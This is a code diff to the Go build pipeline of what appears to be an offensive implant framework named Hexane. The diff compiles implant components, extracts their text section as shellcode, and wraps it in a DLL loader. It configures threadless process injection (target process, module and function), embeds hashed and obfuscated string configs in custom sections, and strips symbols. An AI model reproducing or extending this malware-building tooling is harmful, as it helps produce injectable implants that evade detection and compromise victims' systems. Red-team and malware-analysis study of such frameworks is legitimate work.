@@ -5,9 +5,16 @@ import (
 	"os"
 	"os/exec"
 	"path"
-	"path/filepath"
 	"strconv"
 	"time"
+)
+
+var (
+	LinkerLoader 	= LoaderPath + "/linker.loader.ld"
+	LinkerImplant 	= ImplantPath + "/linker.implant.ld"
+	HashStrings 	= ConfigsPath + "/strings.txt"
+	DllMain   		= LoaderPath + "dllmain.cpp"
+	RsrcScript  	= LoaderPath + "/resource.rc"
 )
 
 func (h *HexaneConfig) RunBuild() error {
@@ -70,7 +77,7 @@ func (h *HexaneConfig) CreateDefinitions(defs map[string][]byte) string {
 	return list
 }
 
-func (h *HexaneConfig) CompileObject(command string, targets, flags, includes []string, output string, key []byte) error {
+func (h *HexaneConfig) CompileObject(command string, targets, flags, includes []string, output string) error {
 	var (
 		Command string
 		err     error
@@ -80,10 +87,6 @@ func (h *HexaneConfig) CompileObject(command string, targets, flags, includes []
 
 	if targets != nil {
 		Command += h.CreateArguments(targets)
-	}
-
-	if key != nil {
-		Command += h.CreateDefinitions(map[string][]byte{"OBF_KEY": key})
 	}
 
 	if includes != nil {
@@ -122,64 +125,54 @@ func (h *HexaneConfig) GenerateConfig() error {
 	return nil
 }
 
-
-func (h *HexaneConfig) GetInjectMethod() InjectConfig {
-	var InjectCfg InjectConfig
-
-	if h.Implant.Injection.Threadless != nil {
-		InjectCfg.InjectMethod = h.Implant.Injection.Threadless.Execute
-		InjectCfg.InjectObject = h.Compiler.BuildDirectory + "/" + filepath.Base(InjectCfg.InjectMethod) + ".o"
-		InjectCfg.InjectConfig = map[string][]byte{
-			"OBF_KEY": h.Key,
-			"PARENT":  []byte(h.Implant.Injection.Threadless.ProcName),
-			"MODULE":  []byte(h.Implant.Injection.Threadless.ModuleName),
-			"FUNC":    []byte(h.Implant.Injection.Threadless.FuncName),
-		}
-	} else if h.Implant.Injection.Threadpool != nil {
-		// TP
-	}
-
-	return InjectCfg
-}
-
 func (h *HexaneConfig) GenerateLoader() error {
-	var err error
+	var (
+		err error
+		injectCfg *InjectConfig
+	)
 
-	InjectCfg := h.GetInjectMethod()
 	RsrcObj := h.Compiler.BuildDirectory + "/resource.res"
 	RsrcData := h.Compiler.BuildDirectory + "/shellcode.bin"
-	LoaderObj := h.Compiler.BuildDirectory + "/loader.asm.o"
-	LoaderData := h.Compiler.BuildDirectory + "/loader.bin"
+	CoreCpp := h.Compiler.BuildDirectory + "/ldrcore.cpp"
 	CoreComponents := h.Compiler.BuildDirectory + "/ldrcore.cpp.o"
 	Output := h.Compiler.BuildDirectory + "/" + h.ImplantName + h.Compiler.FileExtension
+
+
+	WrapMessage("DBG", "generating loader config")
+	if injectCfg, err = h.GetInjectConfig(); err != nil {
+		return err
+	}
+
+	WrapMessage("DBG", "generating strings config")
+	injectCfg.InjectConfig = h.GetEmbededStrings(injectCfg.Strings)
 
 	if err = h.RunCommand(h.Compiler.Windres + " -O coff " + RsrcScript + " -DRSRCDATA=\"" + RsrcData + "\" -o " + RsrcObj); err != nil {
 		return err
 	}
 
-	if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + LoaderObj + " " + LoaderData); err != nil {
+	WrapMessage("DBG", "compiling execute object")
+	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{CoreCpp, injectCfg.ExecuteObj}, nil, h.Compiler.IncludeDirs, CoreComponents); err != nil {
 		return err
 	}
 
-	// TODO: change this from preproc-def to embeded in section config
-	// tbh none of this should be preproc-defs
-	if InjectCfg.InjectConfig["LOADER"], err = os.ReadFile(LoaderData); err != nil {
+	Components := []string{
+		DllMain,
+		RsrcObj,
+		CoreComponents,
+	}
+
+	WrapMessage("DBG", "compiling final dll")
+	if err = h.CompileObject(h.Compiler.Linker+" -T "+LinkerLoader, Components, []string{"-shared"}, h.Compiler.IncludeDirs, Output); err != nil {
 		return err
 	}
 
-	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{InjectCfg.InjectMethod}, nil, h.Compiler.IncludeDirs, InjectCfg.InjectObject, h.Key); err != nil {
-		return err
-	}
-
-	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{CoreComponents, InjectCfg.InjectObject}, nil, h.Compiler.IncludeDirs, CoreComponents, h.Key); err != nil {
-		return err
-	}
-
-	if err = h.CompileObject(h.Compiler.Mingw, Components, []string{"-shared"}, h.Compiler.IncludeDirs, Output, h.Key); err != nil {
+	WrapMessage("DBG", "embeding strings config into loader dll")
+	if err = h.EmbedSectionData(Output, ".text$G", injectCfg.InjectConfig); err != nil {
 		return err
 	}
 
 	if !h.Compiler.Debug {
+		WrapMessage("DBG", "stripping symbols")
 		if err = h.RunCommand(h.Compiler.Strip + " " + Output); err != nil {
 			return err
 		}
@@ -195,8 +188,7 @@ func (h *HexaneConfig) GenerateObjects() error {
 		err   error
 	)
 
-	WrapMessage("DBG", "generating core object files")
-	var embedStrings = h.GetEmbededStrings()
+	var embedStrings = h.GetEmbededStrings(ModuleStrings)
 
 	for _, dir = range h.Compiler.ComponentDirs {
 		if files, err = os.ReadDir(dir); err != nil {
@@ -212,14 +204,17 @@ func (h *HexaneConfig) GenerateObjects() error {
 			ObjFile := RootDirectory + h.Compiler.BuildDirectory + "/" + file.Name() + ".o"
 
 			if path.Ext(file.Name()) == ".cpp" {
-				if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{FilePath}, h.Compiler.Flags, []string{RootDirectory}, ObjFile, h.Key); err != nil {
+				if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{FilePath}, h.Compiler.Flags, []string{RootDirectory}, ObjFile); err != nil {
 					return err
 				}
 
 				if file.Name() == "core.cpp" {
+					WrapMessage("DBG", "embedding core config")
 					if err = h.EmbedSectionData(ObjFile, ".text$F", h.ConfigBytes); err != nil {
 						return err
 					}
+
+					WrapMessage("DBG", "embedding strings config")
 					if err = h.EmbedSectionData(ObjFile, ".text$G", embedStrings); err != nil {
 						return err
 					}
@@ -228,7 +223,7 @@ func (h *HexaneConfig) GenerateObjects() error {
 				h.Components = append(h.Components, ObjFile)
 
 			} else if path.Ext(file.Name()) == ".asm" {
-				if err = h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{FilePath}, nil, nil, ObjFile, h.Key); err != nil {
+				if err = h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{FilePath}, nil, nil, ObjFile); err != nil {
 					return err
 				}
 
@@ -237,10 +232,10 @@ func (h *HexaneConfig) GenerateObjects() error {
 		}
 	}
 
-	WrapMessage("DBG", "building intermediate object")
 	Intermediate := h.Compiler.BuildDirectory + "/interm.exe"
 
-	if err = h.CompileObject(h.Compiler.Linker+" -T "+Ld, h.Components, nil, h.Compiler.IncludeDirs, Intermediate, nil); err != nil {
+	WrapMessage("DBG", "linking core components")
+	if err = h.CompileObject(h.Compiler.Linker+" -T "+LinkerImplant, h.Components, nil, h.Compiler.IncludeDirs, Intermediate); err != nil {
 		return err
 	}
 
@@ -255,7 +250,8 @@ func (h *HexaneConfig) RunCommand(cmd string) error {
 		err     error
 	)
 
-	LogName = "../logs/" + strconv.Itoa(int(h.Implant.PeerId)) + "-build-error.log"
+	WrapMessage("DBG", fmt.Sprintf("running command: %s", cmd))
+	LogName = LogsPath + strconv.Itoa(int(h.Implant.PeerId)) + "-build-error.log"
 
 	if Log, err = os.Create(LogName); err != nil {
 		return err
@@ -280,28 +276,33 @@ func (h *HexaneConfig) BuildUpdate() error {
 	)
 
 	WrapMessage("INF", "starting build...")
-
 	if err = os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
 		return err
 	}
 
+	WrapMessage("INF", "generating config")
 	if err = h.GenerateConfig(); err != nil {
 		return err
 	}
 
-	if err = GenerateHashes(); err != nil {
+	WrapMessage("INF", "generating hashes")
+	if err = GenerateHashes(RootDirectory + HashStrings, RootDirectory + "/src/include/names.hpp"); err != nil {
+
 		return err
 	}
 
+	WrapMessage("INF", "generating core components")
 	if err = h.GenerateObjects(); err != nil {
 		return err
 	}
 
-	if err = h.GenerateShellcode(); err != nil {
+	WrapMessage("INF", "generating shellcode")
+	if err = h.CopySectionData(h.Compiler.BuildDirectory + "/interm.exe", h.Compiler.BuildDirectory + "/shellcode.bin", ".text"); err != nil {
 		return err
 	}
 
 	if h.BuildType == "dll" {
+		WrapMessage("INF", "generating dll loader")
 		if err = h.GenerateLoader(); err != nil {
 			return err
 		}
